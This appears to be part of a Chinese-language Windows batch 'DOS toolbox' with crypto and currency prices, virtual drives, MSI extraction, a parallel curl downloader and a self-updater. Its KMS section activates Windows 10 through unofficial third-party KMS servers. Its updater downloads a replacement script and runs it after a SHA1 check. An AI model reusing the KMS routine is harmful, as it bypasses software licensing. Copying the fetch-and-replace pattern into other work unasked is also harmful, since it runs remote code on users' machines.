set /p =1  → !xmrtocny!		24小时涨跌幅: <nul
if "!xmr24h:~0,1!" equ "-" (call :colortxt a !xmr24h!) else (call :colortxt c +!xmr24h!)
set /p =%% <nul
echo;
echo;
echo;文件币FILE → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !filetocny!		24小时涨跌幅: <nul
if "!file24h:~0,1!" equ "-" (call :colortxt a !file24h!) else (call :colortxt c +!file24h!)
set /p =%% <nul
echo;
echo;
echo;狗狗币DOGE → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !dogetocny!			24小时涨跌幅: <nul
if "!doge24h:~0,1!" equ "-" (call :colortxt a !doge24h!) else (call :colortxt c +!doge24h!)
set /p =%% <nul
echo;
echo;
echo;美元USD    → 人民币CNY
echo;	1  → !usdtocny!
echo;
echo;欧元EUR    → 人民币CNY
echo;	1  → !eurtocny!
echo;
echo;英镑GBP    → 人民币CNY
echo;	1  → !gbptocny!
echo;
echo;日元JPY    → 人民币CNY
echo;	1  → !jpytocny!
echo;
echo;港币HKD    → 人民币CNY
echo;	1  → !hkdtocny!
echo;
echo;新台币TWD  → 人民币CNY
echo;	1  → !twdtocny!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:68
setlocal
cls
title 创建虚拟盘符!system!
set "cho=120"
echo;[1]将路径与盘符关联
echo;[2]删除虚拟盘符
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto 68.1)
if "!shuru!" equ "2" (goto 68.2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto 68
:68.1
title 将路径与盘符关联!system!
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
echo;当前已有盘符: !sypf!
echo;虚拟盘符:
for /f "delims=" %%a in ('subst') do (echo;%%a)
!hx!
set newpf=
set /p "newpf=输入要创建的新盘符:"
call :checkvar newpf az jg
if "!jg!" neq "0" (
	call :strlen newpf jg
	if "!jg!" neq "1" (
		set /p =无效输入<nul
		call :out 2
		goto 68.1
	)
)
set gllj=
set /p "gllj=输入要关联的路径: "
call :ljjc gllj dir
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	endlocal
	goto 68
)
subst !newpf!: !gllj!
if "!errorlevel!" equ "0" (
	set /p =创建成功<nul
	call :out 2
	endlocal
	goto 68
) else (
	set /p =创建失败<nul
	call :out 2
	endlocal
	goto 68
)
:68.2
title 删除虚拟盘符!system!
cls
echo;虚拟盘符:
for /f "delims=" %%a in ('subst') do (echo;%%a)
!hx!
set xzxnp=
set /p "xzxnp=输入要卸载的盘符: "
call :checkvar newpf az jg
if "!jg!" neq "0" (
	call :strlen newpf jg
	if "!jg!" neq "1" (
		set /p =无效输入<nul
		call :out 2
		goto 68.2
	)
)
subst !xzxnp!: /d
if "!errorlevel!" equ "0" (
	set /p =卸载成功<nul
	call :out 2
	endlocal
	goto 68
) else (
	set /p =卸载失败<nul
	call :out 2
	endlocal
	goto 68
)
:69
setlocal
title 解压msi安装文件!system!
cls
set msiurl=
set /p "msiurl=输入msi文件路径(e=返回菜单): "
if /i "!msiurl!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc msiurl
if "!errorlevel!" equ "0" (
	echo;无效路径
	call :out 2
	endlocal
	goto 69
)
for /f "delims=" %%a in ("!msiurl!") do (
	if /i "%%~xa" neq ".msi" (
		echo;不是msi文件
		call :out 2
		endlocal
		goto 69
	)
)
set msidir=
set /p "msidir=输入msi文件解压路径(不能解压到已存在的文件夹, 默认路径为msi文件所在路径)(e=返回菜单): "
if /i "!msidir!" equ "e" (
	endlocal
	goto memuv2
)
if not defined msidir (
	for /f "delims=" %%a in ("!msiurl!") do (
		set "msidir=%%~dpna"
	)
)
call :lj msidir msidir
echo;开始解压...
if not exist "!msidir!" (
	msiexec /a "!msiurl!" /quiet /passive /qn targetdir="!msidir!"
) else (
	echo;不能解压到已存在的文件夹
	call :out 2
)
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:70
setlocal
title 生成CMD控制台色彩表!system!
cls
color 07
set cs=0
for /l %%a in (40,1,47) do (
	for /l %%b in (90,1,97) do (
		if %%a lss 10 (set "xh1=0%%a") else (set "xh1=%%a")
		if %%b lss 10 (set "xh2=0%%b") else (set "xh2=%%b")
		if "!xh1!" equ "40" (
			set bj=0
		) else (
			if "!xh1!" equ "41" (
				set bj=4
			) else (
				if "!xh1!" equ "42" (
					set bj=2
				) else (
					if "!xh1!" equ "43" (
						set bj=6
					) else (
						if "!xh1!" equ "44" (
							set bj=1
						) else (
							if "!xh1!" equ "45" (
								set bj=5
							) else (
								if "!xh1!" equ "46" (
									set bj=3
								) else (
									if "!xh1!" equ "47" (
										set bj=7
									)
								)
							)
						)
					)
				)
			)
		)
		if "!xh2!" equ "90" (
			set zt=8
		) else (
			if "!xh2!" equ "91" (
				set zt=c
			) else (
				if "!xh2!" equ "92" (
					set zt=a
				) else (
					if "!xh2!" equ "93" (
						set zt=e
					) else (
						if "!xh2!" equ "94" (
							set zt=9
						) else (
							if "!xh2!" equ "95" (
								set zt=d
							) else (
								if "!xh2!" equ "96" (
									set zt=b
								) else (
									if "!xh2!" equ "97" (
										set zt=f
									)
								)
							)
						)
					)
				)
			)
		)
		if !cs! lss 7 (
			set /p =!cswz!!xh2!;!xh1!m  !bj!!zt!  !cswz!0m<nul
			set /a "cs+=1"
		) else (
			echo;!cswz!!xh2!;!xh1!m  !bj!!zt!  !cswz!0m
			set cs=0
		)
	)
)
set cs=0
for /l %%a in (40,1,47) do (
	for /l %%b in (90,1,97) do (
		if %%a lss 10 (set "xh1=0%%a") else (set "xh1=%%a")
		if %%b lss 10 (set "xh2=0%%b") else (set "xh2=%%b")
		if !cs! lss 7 (
			set /p =!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m<nul
			set /a "cs+=1"
		) else (
			echo;!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m
			set cs=0
		)
	)
)
for /l %%a in (90,1,97) do (
	for /l %%b in (40,1,47) do (
		if %%a lss 10 (set "xh1=0%%a") else (set "xh1=%%a")
		if %%b lss 10 (set "xh2=0%%b") else (set "xh2=%%b")
		if !cs! lss 7 (
			set /p =!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m<nul
			set /a "cs+=1"
		) else (
			echo;!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m
			set cs=0
		)
	)
)
set /p =!cswz!s!cswz!27;0H<nul
for /l %%b in (1,1,4) do (
	echo;
	for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;255;0;%%am !cswz!0m<nul)
	for /l %%a in (0,13,255) do (set /p =!cswz!48;2;255;%%a;0m !cswz!0m<nul)
	for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;%%a;255;0m !cswz!0m<nul)
	for /l %%a in (0,13,255) do (set /p =!cswz!48;2;0;255;%%am !cswz!0m<nul)
	for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;0;%%a;255m !cswz!0m<nul)
	for /l %%a in (0,13,255) do (set /p =!cswz!48;2;%%a;0;255m !cswz!0m<nul)
)
set /p =!cswz!u<nul
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:71
setlocal
title KMS激活Windows 10!system!
cls
(
set "Core=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99"
set "CoreCountrySpecific=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR"
set "CoreN=3KHY7-WNT83-DGQKR-F7HPR-844BM"
set "CoreSingleLanguage=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH"
set "ProfessionalStudent=YNXW3-HV3VB-Y83VG-KPBXM-6VH3Q"
set "ProfessionalStudentN=8G9XJ-GN6PJ-GW787-MVV7G-GMR99"
set "Professional=W269N-WFGWX-YVC9B-4J6C9-T83GX"
set "ProfessionalN=MH37W-N47XK-V7XM9-C7227-GCQG9"
set "ProfessionalSN=8Q36Y-N2F39-HRMHT-4XW33-TCQR4"
set "ProfessionalWMC=NKPM6-TCVPT-3HRFX-Q4H9B-QJ34Y"
set "Enterprise=NPPR9-FWDCX-D2C8J-H872K-2YT43"
set "EnterpriseN=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4"
set "Education=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2"
set "EducationN=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ"
set "EnterpriseS=WNMTR-4C88C-JK8YV-HQ7T2-76DF9"
set "EnterpriseSN=2F77B-TNFGY-69QQF-B8YKP-D69TJ"
)
for /f "tokens=3 delims= " %%a in ('reg QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "EditionID"') do (
	set "sysid=%%a"
)
set server=
if defined !sysid! (echo;系统名称: !system:~3!) else (call :colortxt c 没有当前系统的激活密钥&echo;)
ping /4 /n 1 www.baidu.com>nul||call :colortxt c 没有网络连接&echo;
echo;请选择KMS服务器
set "cho=120"
!hx!
echo;[1]kms.loli.best
echo;[2]kms.03k.org
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (set "server=kms.loli.best"&goto 71.1)
if "!shuru!" equ "2" (set "server=kms.03k.org"&goto 71.1)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =无效输入<nul
call :out 2
endlocal
goto 71
:71.1
cls
set /p =KMS服务器: <nul
call :colortxt a !server!
echo;
set /p =系统名称: <nul
call :colortxt a "!system:~3!"
echo;
if defined sysid (cscript //Nologo %windir%\system32\slmgr.vbs /ipk !%sysid%!)
cscript //Nologo %windir%\system32\slmgr.vbs /skms !server!
cscript //Nologo %windir%\system32\slmgr.vbs /ato
start slmgr.vbs -xpr
!hx!
echo;如果显示激活失败[错误: 0xC004F074]，应更换KMS服务器.
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:72
setlocal
title curl多进程下载!system!
cls
if not exist "%systemroot%\system32\curl.exe" (
	if not exist .\curl.exe (
		echo;没有找到curl.exe
		call :out 2
		setlocal
		goto memuv2
	)
)
:72.1
cls
set filename=
set url=
set /p "url=输入下载链接(e=返回): "
if not defined url (
	echo;链接不能为空!
	call :out 2
	goto 72.1
)
if /i "!url!" equ "e" (
	endlocal
	goto memuv2
)
set tr=
set /p "tr=输入下载进程数(默认16): "
if not defined tr (set tr=16)
set tr|findstr "\<[0-9]*\>">nul
if "!errorlevel!" neq "0" (
	echo;只能输入数字!
	call :out 2
	goto 72.1
)
set dir=
set /p "dir=输入保存路径(默认当前DOS工具箱所在路径): "
if not defined dir (
	for /f "delims=" %%a in ("!weizhi!") do (set "dir=%%~dpa")
)
if not exist "!dir!" (
	echo;路径 !dir! 不存在
	call :out 2
	goto 72.1
)
dir /ad !dir!>nul 2>nul||(
	echo;路径 !dir! 不是一个文件夹
	call :out 2
	goto 72.1
)
cls
echo;开始获取文件信息...
set filename=
if exist "%temp%\tag" (del /f /q "%temp%\tag")
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
curl !proxy! !doh! -A "!ua!" -I --compressed -# -L -o tag --connect-timeout 5 --output-dir "%temp%" "!url!"
if not exist "%temp%\tag" (
	echo;没有获取到文件信息
	!hx!
	set /p =按任意键返回菜单<nul&pause>nul
	endlocal
	goto memuv2
)
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Accept-Ranges:"') do (set "trflag=%%a")
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Content-Length:"') do (set "filesize=%%a")
for /f "tokens=2 delims==" %%a in ('type %temp%\tag^|findstr /c:"filename="') do (set "filename=%%a")
if "!trflag!" neq "bytes" (set tr=1)
if defined filesize (
	call :xdwjs !filesize! b dw
) else (
	set "dw=未知 (转为单进程下载)"
)
if not defined filename (set /p "filename=输入文件名: ")
if not defined filename (set filename=curl下载文件)
set /a "fd=filesize/tr"
set /a "ys=filesize%%tr"
set oldfd=0
set /a "pdtr=tr-1"
set /a "newfd=fd-1"
set /a "pdfd=fd+ys"
set file=
for /l %%a in (1,1,!tr!) do (set "file=!file!%%a+")
set newtr=
set /a "newtr=tr+1"
set "file=!file:~0,-1!"
cls
echo;文件名:		!filename!
echo;文件大小:	!dw!
if "!trflag!" neq "bytes" (echo;该链接不支持多线程传输,进程数自动设置为1)
echo;进程数:		!tr!
echo;传输片段大小:	!fd!+!ys!
echo;保存路径:	!dir!
!hx!
set /p =按任意键开始下载<nul&pause>nul
cls
echo;开始下载文件...
if not defined filesize (goto 72.3)
title curl多进程下载 - 等待文件下载完成(按e返回菜单)!system!
if exist "%temp%\down" (rd /s /q "%temp%\down")
md "%temp%\down"
set "kssj=!time!"
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
for /l %%a in (1,1,!tr!) do (
	start /min /low "curl多进程下载_!tr!" ^
	curl !proxy! !doh! -A "!ua!" --compressed -# -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -r !oldfd!-!newfd! -o %%a --output-dir "%temp%\down" "!url!"
	set /a "oldfd=newfd+1"
	if "%%a" equ "!pdtr!" (set newfd=) else (set /a "newfd=oldfd+fd-1")
)
pushd "%temp%\down"
cls
:72.2
(
cls
set /p =!cswz!s!cswz!0;0H<nul
set jccs=
set jingdu=
set /p =!cswz!0;76H<nul
call :colortxt a 等待文件下载完成^(按e返回菜单^)...
set /p =!cswz!u<nul
)
for /l %%a in (1,1,!tr!) do (
	set "ssdx=%%~za"
	if not defined ssdx (set ssdx=0)
	if "%%a" equ "!tr!" (
		if "!ssdx!" equ "!pdfd!" (
			echo;进程%%a完成
			set /a "jccs+=1"
		) else (
			set fhz=
			call :cf !ssdx! !pdfd! 2 fhz
			set "jcjd=!fhz:~2,2!"
			if "!jcjd:~0,1!" equ "0" (set "jcjd=!jcjd:~1,1!")
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (set "jdt=!jdt!:")
			set /p =进程%%a的进度:	[<nul
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	) else (
		if "!ssdx!" equ "!fd!" (
			echo;进程%%a完成
			set /a "jccs+=1"
		) else (
			set fhz=
			call :cf !ssdx! !fd! 2 fhz
			set "jcjd=!fhz:~2,2!"
			if "!jcjd:~0,1!" equ "0" (set "jcjd=!jcjd:~1,1!")
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (set "jdt=!jdt!:")
			set /p =进程%%a的进度:	[<nul
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	)
)
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ "2" (
	taskkill /fi "windowtitle eq curl多进程下载_*" /fi "imagename eq curl.exe" /f
	popd
	rd /s /q "%temp%\down"
	del "%temp%\tag"
	endlocal
	goto memuv2
)
if "!jccs!" neq "!tr!" (goto 72.2)
set "jssj=!time!"
cls
echo;合并文件中...
if "!dir:~-1!" neq "\" (set "dir=!dir!\")
copy /b /z !file! "!dir!!filename!"
popd
rd /s /q "%temp%\down"
del /f /q "%temp%\tag"
:72.4
cls
title curl多进程下载!system!
if "!dir:~-1!" neq "\" (set "dir=!dir!\")
if exist "!dir!!filename!" (
	for /f "delims=" %%a in ("!dir!!filename!") do (
		echo;计算下载速度...
		call :sjc !kssj! !jssj! raw
		call :sjc !kssj! !jssj! xzys format
		call :Division !raw! 1000 3 xzsd
		call :Division !filesize! !xzsd! 3 sd
		call :xdwjs !sd! d dw
		forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
		cls
		echo;下载完成
		echo;链接:		!url!
		echo;用时:		!xzys!
		echo;平均下载速度:  !size! !dw!/s
		echo;文件:		%%~nxa
		if %%~za geq 1024 (
			call :xdwjs %%~za b dw
			echo;文件大小:	%%~za字节 约!dw!
		) else (
			echo;文件大小:	%%~za字节
		)
		echo;保存路径:	%%~dpa
	)
) else (
	forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
	cls
	echo;链接:	!url!
	echo;下载失败
)
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:72.3
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
if "!dir:~-1!" equ "\" (set "dir=!dir:~0,-1!")
set "kssj=!time!"
curl !proxy! !doh! -A "!ua!" --compressed -# -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o "!filename!" --output-dir "!dir!" "!url!"
set "jssj=!time!"
for /f "delims=" %%a in ("!dir!\!filename!") do (set "filesize=%%~za")
goto 72.4
:hash
setlocal
for /f "delims=" %%a in ("%1") do (set "url=%%~a")
set "shuanfa=%2"
if "!shuanfa!" equ "" (set "shuanfa=sha256")
for /f "skip=1 eol=C" %%a in ('"certutil -hashfile "!url!" !shuanfa!"') do (
	if "%3" neq "" (
		endlocal&set "%3=%%a"
		goto :eof
	) else (
		echo;%%a
		goto :eof
	)
	
)
goto :eof
::for /f "delims=" %%a in ('"powershell get-filehash %url% -algorithm %shuanfa%^|select-object hash^|format-list"') do (set hash=%%a)
::set hash=%hash:~7%
:update
setlocal
cls
title 更新DOS工具箱 - 当前版本: !ver!!system!
set resolve2=--resolve raw.github.io:443:^
185.199.110.133,^
185.199.109.133,^
185.199.111.133,^
185.199.108.133,^
2606:50c0:8001::154,^
2606:50c0:8003::154,^
2606:50c0:8000::154,^
2606:50c0:8002::154
set "jshost=-H "host: cdn.jsdelivr.net""
set "githost=-H "host: raw.githubusercontent.com""
set "gxurlhost1=https://raw.github.io/Trustedinstall/dostool/main/update.js"
set "gxurlhost2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js"
set "gxurl1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/update.js"
set "gxurl2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js"
set "gxdoshost1=https://raw.github.io/Trustedinstall/dostool/main/dostool.js"
set "gxdoshost2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js"
set "gxdos1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/dostool.js"
set "gxdos2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js"
echo;检查最新版本...
if exist "%temp%\dostoolupdate" (del /f /q "%temp%\dostoolupdate")
if exist "%systemroot%\system32\curl.exe" (
	pushd "%temp%"
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
		if "%%a" equ "0x1" (
			for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
				set "proxy=-x %%b"
				echo;使用代理:	%%b
			)
		) else (
			set proxy=
		)
	)
	echo;使用链接:	!gxurlhost1!
	echo;Host域名:	!githost:~10,-1!
	curl !proxy! !doh! !githost! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 !resolve2! -o dostoolupdate !gxurlhost1!
	if exist "%temp%\dostoolupdate" (
		for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "dossize=%%c"
			set "host=!githost!"
			set "resolve=!doh! !resolve2!"
			set "url=!gxdoshost1!"
		)
		popd
		goto updatecheck
	) else (
		echo;使用链接:	!gxurl1!
		curl !proxy! !doh! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o dostoolupdate !gxurl1!
		if exist "%temp%\dostoolupdate" (
			for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "dossize=%%c"
				set host=
				set resolve=
				set "url=!gxdos1!"
			)
			popd
			goto updatecheck
		) else (
			echo;使用链接:	!gxurlhost2!
			echo;Host域名:	!jshost:~10,-1!
			curl !proxy! !doh! !jshost! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 !resolve2! -o dostoolupdate !gxurlhost2!
			if exist "%temp%\dostoolupdate" (
				for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
					set "gxver=%%a"
					set "doshash=%%b"
					set "dossize=%%c"
					set "host=!jshost!"
					set "resolve=!doh! !resolve2!"
					set "url=!gxdoshost2!"
				)
				popd
				goto updatecheck
			) else (
				echo;使用链接:	!gxurl2!
				curl !proxy! !doh! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o dostoolupdate !gxurl2!
				if exist "%temp%\dostoolupdate" (
					for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
						set "gxver=%%a"
						set "doshash=%%b"
						set "dossize=%%c"
						set host=
						set resolve=
						set "url=!gxdos2!"
					)
					popd
					goto updatecheck
				) else (
					echo;没有检查到更新版本
					!hx!
					set /p =按任意键返回菜单<nul&pause>nul
					endlocal
					set verbak=
					goto memuv2
				)
			)
		)
	)
) else (
	echo;使用链接:	!gxurl1!
	certutil -urlcache -split -f !gxurl1! "%temp%\dostoolupdate"
	if exist "%temp%\dostoolupdate" (
		for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "dossize=%%c"
			set "url=!gxdos1!"
		)
		goto updatecheck
	) else (
		echo;使用链接:	!gxurl2!
		certutil -urlcache -split -f !gxurl2! "%temp%\dostoolupdate"
		if exist "%temp%\dostoolupdate" (
			for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "dossize=%%c"
				set "url=!gxdos2!"
			)
			goto updatecheck
		) else (
			echo;没有检查到更新版本
			!hx!
			set /p =按任意键返回菜单<nul&pause>nul
			endlocal
			set verbak=
			goto memuv2
		)
	)
)
:updatecheck
cls
set /a "checkver=gxver-verbak"
if !checkver! gtr 0 (
	set /p =检查到更新版本: <nul
	call :colortxt a !gxver!
	call :xdwjs %~z0 b old
	call :xdwjs !dossize! b new
	call :hash "!weizhi!" sha1 oldhash
	echo;
	echo;文件大小: !old!（%~z0 字节）→ !new!（!dossize! 字节）
	echo;SHA1: !oldhash! → !doshash!
	!hx!
	set shuru=
	set /p "shuru=按回车键更新，按e返回菜单:"
	if "!shuru!" equ "" (goto startupdate)
	if /i "!shuru!" equ "e" (
		del /f /q "%temp%\dostoolupdate"
		endlocal
		set verbak=
		goto memuv2
	)
	set /p =输入无效<nul
	call :out 2
	goto updatecheck
) else (
	del /f /q "%temp%\dostoolupdate"
	echo;没有检查到更新版本
	!hx!
	set /p =按任意键返回菜单<nul&pause>nul
	endlocal
	set verbak=
	goto memuv2
)
:startupdate
cls
echo;正在下载更新...
if exist "%temp%\dostool" (del /f /q "%temp%\dostool")
if exist "%systemroot%\system32\curl.exe" (
	pushd "%temp%"
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
		if "%%a" equ "0x1" (
			for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
				set "proxy=-x %%b"
				echo;使用代理:	%%b
			)
		) else (
			set proxy=
		)
	)
	echo;使用链接:	!url!
	if defined host (echo;Host域名:	!host:~10,-1!)
	curl !proxy! !doh! !host! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 !resolve2! -o dostool !url!
	popd
	call :hash "%temp%\dostool" sha1 hash
	if /i "!hash!" equ "!doshash!" (
		endlocal
		endlocal
		copy /z /y "%temp%\dostool" %0&goto chushihua
	) else (
		call :colortxt c 文件无效
		echo;
		call :out 2
		endlocal
		set verbak=
		goto memuv2
	)
) else (
	certutil -urlcache -split -f !url! "%temp%\dostool"
	call :hash "%temp%\dostool" sha1 hash
	if /i "!hash!" equ "!doshash!" (
		endlocal
		endlocal
		copy /z /y "%temp%\dostool" %0&goto chushihua
	) else (
		call :colortxt c 文件无效
		echo;
		call :out 2
		endlocal
		set verbak=
		goto memuv2
	)
)
::bitsadmin /transfer 下载更新中... /priority FOREGROUND https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js %weizhi%&start %comspec% /c %0&exit 0
:sjc
REM 参数: 开始时间和结束时间，格式为 HH:MM:SS.mm
setlocal
set "start_time=%1"
set "end_time=%2"
REM 解析开始时间
for /f "tokens=1-4 delims=:. " %%a in ("!start_time!") do (
    set "start_hour=%%a"
    set "start_minute=%%b"
    set "start_second=%%c"
    set "start_millisecond=%%d"
)
REM 解析结束时间
for /f "tokens=1-4 delims=:. " %%a in ("!end_time!") do (
    set "end_hour=%%a"
    set "end_minute=%%b"
    set "end_second=%%c"
    set "end_millisecond=%%d"
)
REM 去掉前导零并确保以十进制格式进行计算
for %%i in (start_hour start_minute start_second start_millisecond end_hour end_minute end_second end_millisecond) do (
    set "%%i=!%%i: =!"
    set /a "%%i=1!%%i! - 100"
)
REM 计算时间差（毫秒）
set /a "time_difference-=start_hour*3600000+start_minute*60000+start_second*1000+start_millisecond*10"
set /a "time_difference+=end_hour*3600000+end_minute*60000+end_second*1000+end_millisecond*10"
REM 处理跨天情况
if !time_difference! lss 0 (set /a "time_difference+=86400000")
REM 转换时间差为 HH:MM:SS.mm 格式
set /a "diff_hours=time_difference/3600000"
set /a "diff_minutes=(time_difference%%3600000)/60000"
set /a "diff_seconds=(time_difference%%60000)/1000"
set /a "diff_milliseconds=(time_difference%%1000)/10"
REM 格式化输出
if !diff_hours! lss 10 (set "diff_hours=0!diff_hours!")
if !diff_minutes! lss 10 (set "diff_minutes=0!diff_minutes!")
if !diff_seconds! lss 10 (set "diff_seconds=0!diff_seconds!")
if !diff_milliseconds! lss 10 (set "diff_milliseconds=0!diff_milliseconds!")
set "time_diff=!diff_hours!:!diff_minutes!:!diff_seconds!.!diff_milliseconds!"
if "%4" equ "format" (
	for /f "tokens=1-3 delims=:" %%a in ("!time_diff!") do (
		if "%%a" equ "00" (
			if "%%b" equ "00" (
				set "time_diff=%%c秒"
			) else (
				set "time_diff=%%b分%%c秒"
			)
		) else (
			set "time_diff=%%a小时%%b分%%c秒"
		)
	)
)
if "%3" equ "" (
	echo;!time_diff!
) else (
	if "%3" equ "raw" (
		endlocal&set "%3=%time_difference%"
	) else (
		endlocal&set "%3=%time_diff%"
	)
)
goto :eof
:strlen
setlocal
set "$=!%1!#"
set N=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. NEQ . set/aN+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/aN+=0x!$:~16,1!
endlocal&If %2. neq . (set/a%2=%N%)else echo;%N%
goto :eof
:ys
setlocal
for /f "tokens=1,2,3,4 delims=:." %%a in ("!time!") do (
	set /a "start=1%%a*360000+1%%b*6000+1%%c*100+1%%d"
)
:ys_loop
for /f "tokens=1,2,3,4 delims=:." %%a in ("!time!") do (
	set /a "sub=(1%%a*360000+1%%b*6000+1%%c*100+1%%d)-start"
)
if !sub! lss 0 (
	goto :eof
) else (
	if !sub! geq %1 (goto :eof) else (goto ys_loop)
)
goto :eof
:list
(
set start=1
set "a1=清除U盘里的lpk.dll病毒"
set "a2=清除U盘里的jwgkvsq.vmx病毒，并免疫该病毒"
set "a3=清理系统垃圾"
set "a4=显示系统信息"
set "a5=解除任务管理器被禁用"
set "a6=显示被隐藏文件(中了该类病毒后)"
set "a7=解除注册表被禁用"
set "a8=计算开平方"
set "a9=切换到命令提示符"
set "a10=将磁盘格式转换为NTFS"
set "a11=磁盘错误修复"
set "a12=格式化"
set "a13=DOS计算器"
set "a14=解除命令提示符被禁用"
set "a15=随机数生成器"
set "a16=清除KHATRA病毒"
set "a17=打开注册表"
set "a18=打开控制面板"
set "a19=打开DirectX诊断工具"
set "a20=打开计算机管理"
set "a21=用户管理"
set "a22=打开组策略"
set "a23=DOS任务管理器"
set "a24=文件系统信息查询"
set "a25=创建指定大小的文件"
set "a26=免疫U盘病毒"
set "a27=磁盘碎片整理"
set "a28=一键删除空文件夹"
set "a29=ping测试网络延迟"
set "a30=硬件检测"
set "a31=读心术"
set "a32=DOS闹钟"
set "a33=计时器"
set "a34=随机密码生成器"
set "a35=删除每个盘符下的System Volume Information文件夹"
set "a36=二进制转换器"
set "a37=文本浏览"
set "a38=显示计算机与用户的设置"
set "a39=NTFS压缩"
